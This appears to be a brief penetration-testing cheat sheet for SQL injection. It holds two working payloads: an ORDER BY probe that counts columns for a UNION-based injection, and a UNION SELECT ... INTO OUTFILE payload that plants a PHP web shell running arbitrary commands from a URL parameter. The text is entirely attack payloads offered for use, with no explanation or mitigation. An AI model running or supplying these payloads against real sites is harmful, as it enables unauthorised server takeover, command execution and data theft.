Enumerate no. of columns for UNION-based payload:
`' ORDER BY <Column no. to test>-- //`

Inject webshell into PHP site via UNION:
`' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- //`
